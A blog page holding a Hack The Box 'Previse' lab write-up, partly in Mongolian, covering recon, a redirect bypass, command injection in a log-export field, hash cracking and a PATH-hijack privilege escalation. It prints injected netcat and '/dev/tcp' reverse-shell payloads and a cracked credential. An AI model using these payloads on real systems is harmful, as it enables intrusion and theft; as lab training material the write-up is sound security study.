<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Previse | CaDiL's Blog</title>
<meta name=keywords content="Writeup"><meta name=description content="HTB - Previse - Writeup /Mostly Notes/"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-02-23-htb-previse-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-02-23-htb-previse-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HTB - Previse"><meta property="og:description" content="HTB - Previse - Writeup /Mostly Notes/"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-02-23-htb-previse-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-02-23T00:00:00+00:00"><meta property="article:modified_time" content="2024-02-23T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - Previse"><meta name=twitter:description content="HTB - Previse - Writeup /Mostly Notes/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Previse","item":"https://cadil.github.io/posts/2024-02-23-htb-previse-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Previse","name":"HTB - Previse","description":"HTB - Previse - Writeup /Mostly Notes/","keywords":["Writeup"],"articleBody":"PS: “Æ“Ø—Å–≥—ç—Å—ç–Ω –æ–≥–Ω–æ–æ: 2021 –æ–Ω—ã 11-—Ä —Å–∞—Ä—ã–Ω 10~ ”©–¥—Ä“Ø“Ø–¥—ç–¥ –±–∏—á—Å—ç–Ω —Ç—ç–º–¥—ç–≥–ª—ç–ª —é–º.\n1. IP Address # Machine Address 10.10.11.104 # Local Address 10.10.14.139 2. Nmap sudo nmap -sC -sV -oA nmap/previse 10.10.11.104 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-10 05:45 EST Nmap scan report for 10.10.11.104 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.40 seconds 3. Gobuster gobuster dir -u http://10.10.11.104 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php =============================================================== [+] Url: http://10.10.11.104 [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2021/11/10 05:49:15 Starting gobuster in directory enumeration mode =============================================================== /download.php (Status: 302) [Size: 0] [--\u003e login.php] /index.php (Status: 302) [Size: 2801] [--\u003e login.php] /login.php (Status: 200) [Size: 2224] /files.php (Status: 302) [Size: 4914] [--\u003e login.php] /header.php (Status: 200) [Size: 980] /nav.php (Status: 200) [Size: 1248] /footer.php (Status: 200) [Size: 217] /css (Status: 301) [Size: 310] [--\u003e http://10.10.11.104/css/] /status.php (Status: 302) [Size: 2966] [--\u003e login.php] /js (Status: 301) [Size: 309] [--\u003e http://10.10.11.104/js/] /logout.php (Status: 302) [Size: 0] [--\u003e login.php] /accounts.php (Status: 302) [Size: 3994] [--\u003e login.php] /config.php (Status: 200) [Size: 0] /logs.php (Status: 302) [Size: 0] [--\u003e login.php] Progress: 13674 / 441122 (3.10%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2021/11/10 05:54:51 Finished =============================================================== nav.php -\u003e CREATE ACCOUNT LINK\n4. Burp GET /accounts.php HTTP/1.1 Host: 10.10.11.104 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Referer: http://10.10.11.104/nav.php Cookie: PHPSESSID=n8t6btqpv1in2cbte4c82i9ggh Upgrade-Insecure-Requests: 1 Sec-GPC: 1 Do Intercept -\u003e Response to this request –¥–∞—Ä–∞–∞–¥ forward —Ö–∏–π–Ω—ç. –î–∞—Ä–∞–∞–≥–∞–∞—Ä 302 –≥–∞—Ä—á –∏—Ä–∂ –±–∞–π–≥–∞–∞–≥ 200 –±–æ–≥–ª–æ–Ω forward —Ö–∏–π–Ω—ç. Browser —Ä—É—É –æ—Ä–æ–æ–¥ —Ö–∞—Ä–≤–∞–ª create user —Ö–∞—Ä–∞–≥–¥–∞–∂ –±–∞–π–Ω–∞. –®–∏–Ω—ç user “Ø“Ø—Å–≥—ç—ç–¥ –Ω—ç–≤—Ç—Ä—ç–Ω –æ—Ä–Ω–æ.\n5. Reverse Shell File menu —Ö—ç—Å—ç–≥—Ç Backup —Ñ–∞–π–ª –±–∞–π–≥–∞–∞ —Ç–∞—Ç–∞–∂ –∞–≤–∞–∞–¥ config.php —Ö–∞—Ä–≤–∞–ª:\n\u003c?php function connectDB(){ $host = 'localhost'; $user = 'root'; $passwd = 'mySQL_p@ssw0rd!:)'; $db = 'previse'; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } Request Log Data Menu - comma —Ç–∞—Ç–∞—Ö “Ø–µ–∏–π–Ω burp:\nPOST /logs.php HTTP/1.1 Host: 10.10.11.104 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 11 Origin: http://10.10.11.104 DNT: 1 Connection: close Referer: http://10.10.11.104/file_logs.php Cookie: PHPSESSID=n8t6btqpv1in2cbte4c82i9ggh Upgrade-Insecure-Requests: 1 Sec-GPC: 1 delim=comma Netcat:\nnc -lvnp 9001 Reverse Shell:\ndelim=comma%26nc+-e+/bin/sh+10.10.14.139+9001 shell –æ—Ä—Å–æ–Ω –±–æ–ª:\npython3 \\-c 'import pty;pty.spawn(\"/bin/sh\")' Backup –¥–æ—Ç–æ—Ä—Ö config.php info –¥—ç—ç—Ä—ç—ç—Å —Ö–∞—Ä–∞—Ö–∞–¥ mysql —Ä—É—É –æ—Ä–æ—Ö –±–æ–ª–æ–º–∂—Ç–æ–π:\nmysql -u root -D previse -p Tables:\nSHOW TABLES' at line 2 mysql\u003e show tables; show tables; +-------------------+ | Tables_in_previse | +-------------------+ | accounts | | files | +-------------------+ 2 rows in set (0.00 sec) mysql\u003e Accounts:\nmysql\u003e SELECT * FROM accounts; SELECT * FROM accounts; +----+----------+------------------------------------+---------------------+ | id | username | password | created_at | +----+----------+------------------------------------+---------------------+ | 1 | m4lwhere | $1$üßÇllol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 | | 2 | ca4mi | $1$üßÇllol$DHtkJzt.08/KEY8tpvplO0 | 2021-11-10 11:01:53 | | 3 | ashot | $1$üßÇllol$eBQMPwAvz9j9ZpK62qDI// | 2021-11-10 11:22:18 | +----+----------+------------------------------------+---------------------+ 3 rows in set (0.00 sec) User: m4lwhere Password: $1$üßÇllol$DQpmdvnb7EeuO6UaqRItf.\nhashcat -a 3 -m 500 hash.txt rockyou.txt ilovecody112235!\nSHH —Ö–∞–Ω–¥–∞—Ö\nssh m4lwhere@10.10.11.104 User.txt\n90a************ 6. Privilege Escalation sudo -l:\nm4lwhere@previse:~$ sudo -l [sudo] password for m4lwhere: User m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.sh /opt/scripts/access_backup.sh\n@vm:\nnc -lvnp 9001 @Machine:\necho \"bash -i \u003e\u0026 /dev/tcp/10.10.14.139/9001 0\u003e\u00261\" \u003e gzip chmod 777 gzip export PATH=/tmp:$PATH /tmp –¥–æ—Ç–æ—Ä –±–∞–π–≥–∞–∞ –±–æ–ª–æ—Ö–æ–æ—Ä –±–∏—á–ª—ç—ç. ”®”©—Ä –≥–∞–∑–∞—Ä –±–∞–π–≥–∞–∞ –±–æ–ª **$(pwd):$PATH\nsudo -l-—Å –≥–∞—Ä—á –∏—Ä—Å—ç–Ω .sh run:\nsudo /opt/scripts/access_backup.sh root.txt\n9dc5eb************ ","wordCount":"651","inLanguage":"mn","datePublished":"2024-02-23T00:00:00Z","dateModified":"2024-02-23T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-02-23-htb-previse-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=–ê—Ä—Ö–∏–≤><span>–ê—Ä—Ö–∏–≤</span></a></li><li><a href=https://cadil.github.io/search/ title=–•–∞–π–ª—Ç><span>–•–∞–π–ª—Ç</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>–ù“Ø“Ø—Ä</a>&nbsp;¬ª&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - Previse</h1><div class=post-description>HTB - Previse - Writeup /Mostly Notes/</div><div class=post-meta><span title='2024-02-23 00:00:00 +0000 UTC'>—Ö–æ—ë—Ä–¥—É–≥–∞–∞—Ä —Å–∞—Ä 23, 2024</span>&nbsp;¬∑&nbsp;4 –ú–ò–ù&nbsp;¬∑&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>–ê–≥—É—É–ª–≥–∞</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap aria-label="2. Nmap">2. Nmap</a></li><li><a href=#3-gobuster aria-label="3. Gobuster">3. Gobuster</a></li><li><a href=#4-burp aria-label="4. Burp">4. Burp</a></li><li><a href=#5-reverse-shell aria-label="5. Reverse Shell">5. Reverse Shell</a></li><li><a href=#6-privilege-escalation aria-label="6. Privilege Escalation">6. Privilege Escalation</a></li></ul></div></details></div><div class=post-content><p><strong>PS</strong>: “Æ“Ø—Å–≥—ç—Å—ç–Ω –æ–≥–Ω–æ–æ: 2021 –æ–Ω—ã 11-—Ä —Å–∞—Ä—ã–Ω 10~ ”©–¥—Ä“Ø“Ø–¥—ç–¥ –±–∏—á—Å—ç–Ω —Ç—ç–º–¥—ç–≥–ª—ç–ª —é–º.</p><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><pre tabindex=0><code># Machine Address
10.10.11.104

# Local Address
10.10.14.139
</code></pre><h3 id=2-nmap>2. Nmap<a hidden class=anchor aria-hidden=true href=#2-nmap>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sC -sV -oA nmap/previse 10.10.11.104
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-11-10 05:45 EST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.104
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.24s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed ports
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>| http-cookie-flags: 
</span></span><span style=display:flex><span>|   /: 
</span></span><span style=display:flex><span>|     PHPSESSID: 
</span></span><span style=display:flex><span>|_      httponly flag not set
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| http-title: Previse Login
</span></span><span style=display:flex><span>|_Requested resource was login.php
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 48.40 seconds
</span></span></code></pre></div><h3 id=3-gobuster>3. Gobuster<a hidden class=anchor aria-hidden=true href=#3-gobuster>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster dir -u http://10.10.11.104 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.11.104
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2021/11/10 05:49:15 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/download.php         <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; login.php<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/index.php            <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 2801<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; login.php<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/login.php            <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 2224<span style=color:#f92672>]</span>                
</span></span><span style=display:flex><span>/files.php            <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 4914<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; login.php<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/header.php           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 980<span style=color:#f92672>]</span>                 
</span></span><span style=display:flex><span>/nav.php              <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 1248<span style=color:#f92672>]</span>                
</span></span><span style=display:flex><span>/footer.php           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 217<span style=color:#f92672>]</span>                 
</span></span><span style=display:flex><span>/css                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 310<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.11.104/css/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/status.php           <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 2966<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; login.php<span style=color:#f92672>]</span>              
</span></span><span style=display:flex><span>/js                   <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 309<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.11.104/js/<span style=color:#f92672>]</span> 
</span></span><span style=display:flex><span>/logout.php           <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; login.php<span style=color:#f92672>]</span>                 
</span></span><span style=display:flex><span>/accounts.php         <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 3994<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; login.php<span style=color:#f92672>]</span>              
</span></span><span style=display:flex><span>/config.php           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span>                                 
</span></span><span style=display:flex><span>/logs.php             <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; login.php<span style=color:#f92672>]</span>                 
</span></span><span style=display:flex><span>Progress: <span style=color:#ae81ff>13674</span> / <span style=color:#ae81ff>441122</span> <span style=color:#f92672>(</span>3.10%<span style=color:#f92672>)</span>                                             ^C
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Keyboard interrupt detected, terminating.
</span></span><span style=display:flex><span>                                                                              
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2021/11/10 05:54:51 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p><code>nav.php</code> -> <code>CREATE ACCOUNT LINK</code></p><h3 id=4-burp>4. Burp<a hidden class=anchor aria-hidden=true href=#4-burp>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /accounts.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 10.10.11.104
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Referer: http://10.10.11.104/nav.php
</span></span><span style=display:flex><span>Cookie: PHPSESSID<span style=color:#f92672>=</span>n8t6btqpv1in2cbte4c82i9ggh
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Sec-GPC: <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>Do Intercept -> <code>Response to this request</code> –¥–∞—Ä–∞–∞–¥ <code>forward</code> —Ö–∏–π–Ω—ç. –î–∞—Ä–∞–∞–≥–∞–∞—Ä <code>302</code> –≥–∞—Ä—á –∏—Ä–∂ –±–∞–π–≥–∞–∞–≥ <code>200</code> –±–æ–≥–ª–æ–Ω forward —Ö–∏–π–Ω—ç. Browser —Ä—É—É –æ—Ä–æ–æ–¥ —Ö–∞—Ä–≤–∞–ª create user —Ö–∞—Ä–∞–≥–¥–∞–∂ –±–∞–π–Ω–∞. –®–∏–Ω—ç user “Ø“Ø—Å–≥—ç—ç–¥ –Ω—ç–≤—Ç—Ä—ç–Ω –æ—Ä–Ω–æ.</p><h3 id=5-reverse-shell>5. Reverse Shell<a hidden class=anchor aria-hidden=true href=#5-reverse-shell>#</a></h3><p>File menu —Ö—ç—Å—ç–≥—Ç Backup —Ñ–∞–π–ª –±–∞–π–≥–∞–∞ —Ç–∞—Ç–∞–∂ –∞–≤–∞–∞–¥ config.php —Ö–∞—Ä–≤–∞–ª:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>connectDB</span>(){
</span></span><span style=display:flex><span>    $host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;localhost&#39;</span>;
</span></span><span style=display:flex><span>    $user <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;root&#39;</span>;
</span></span><span style=display:flex><span>    $passwd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mySQL_p@ssw0rd!:)&#39;</span>;
</span></span><span style=display:flex><span>    $db <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;previse&#39;</span>;
</span></span><span style=display:flex><span>    $mycon <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>mysqli</span>($host, $user, $passwd, $db);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $mycon;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Request Log Data Menu - comma —Ç–∞—Ç–∞—Ö “Ø–µ–∏–π–Ω burp:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /logs.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 10.10.11.104
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>11</span>
</span></span><span style=display:flex><span>Origin: http://10.10.11.104
</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Referer: http://10.10.11.104/file_logs.php
</span></span><span style=display:flex><span>Cookie: PHPSESSID<span style=color:#f92672>=</span>n8t6btqpv1in2cbte4c82i9ggh
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Sec-GPC: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>delim<span style=color:#f92672>=</span>comma
</span></span></code></pre></div><p>Netcat:</p><pre tabindex=0><code>nc -lvnp 9001
</code></pre><p>Reverse Shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>delim<span style=color:#f92672>=</span>comma%26nc+-e+/bin/sh+10.10.14.139+9001
</span></span></code></pre></div><p>shell –æ—Ä—Å–æ–Ω –±–æ–ª:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>python3 <span style=color:#ae81ff>\-</span>c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
